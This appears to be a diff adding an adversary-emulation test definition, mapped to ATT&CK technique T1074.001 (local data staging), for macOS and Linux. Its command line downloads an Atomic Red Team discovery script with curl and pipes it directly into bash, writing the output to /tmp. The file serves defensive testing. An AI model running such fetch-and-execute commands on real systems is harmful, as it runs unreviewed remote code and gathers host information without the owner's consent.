@@ -1,0 +1,23 @@
+- description: 'Utilize curl to download discovery.sh and execute a basic information
+    gathering shell script
+
+    '
+  id: f16438a836c9c466cc3d56cb0262fe3f
+  name: Stage data from Discovery.sh
+  platforms:
+    darwin:
+      sh:
+        cleanup: ''
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
+          | bash -s > /tmp/T1074.001_discovery.log
+        payloads: []
+    linux:
+      sh:
+        cleanup: ''
+        command: curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
+          | bash -s > /tmp/T1074.001_discovery.log
+        payloads: []
+  tactic: collection
+  technique:
+    attack_id: T1074.001
+    name: 'Data Staged: Local Data Staging'
